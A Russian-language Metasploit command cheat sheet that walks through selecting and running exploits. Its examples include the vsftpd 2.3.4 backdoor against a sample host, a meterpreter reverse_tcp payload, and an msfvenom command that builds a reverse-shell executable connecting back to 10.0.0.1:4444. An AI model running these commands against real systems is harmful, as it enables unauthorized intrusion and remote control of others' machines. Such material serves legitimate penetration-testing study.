
1. Запуск Metasploit

msfconsole

2. Поиск эксплоита / модуля

search <ключевое_слово>

Пример:

search vsftpd

3. Выбор модуля

use <модуль>

Пример:

use exploit/unix/ftp/vsftpd_234_backdoor

4. Просмотр параметров модуля

show options

Показывает, какие параметры нужно задать (например, RHOST, RPORT).
5. Установка параметров

set <параметр> <значение>

Пример:

set RHOST 192.168.1.10
set RPORT 21

6. Запуск атаки

run

или

exploit

7. Просмотр сессий

sessions

8. Подключение к сессии

sessions -i <номер_сессии>

9. Завершение сессии

sessions -k <номер_сессии>

10. Просмотр доступных payload’ов

show payloads

11. Выбор payload’а (после выбора эксплоита)

set payload <payload>

Пример:

set payload linux/x86/meterpreter/reverse_tcp

12. Генерация вредоносного файла (msfvenom)

msfvenom -p <payload> LHOST=<ваш_IP> LPORT=<порт> -f <формат> -o <имя_файла>

Пример:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

13. Просмотр всех модулей

show exploits
show auxiliary
show post

14. Использование вспомогательных модулей (auxiliary)

Для сканирования, брутфорса и т.п.
15. Получение справки по команде

help

Как читать вывод:

    После запуска эксплоита метасплоит сообщает, успешна ли атака (exploit success) или нет.

    Если сессия открыта, будет ID сессии — можно подключиться.

    Ошибки показывают, что что-то не так с параметрами или с уязвимостью.
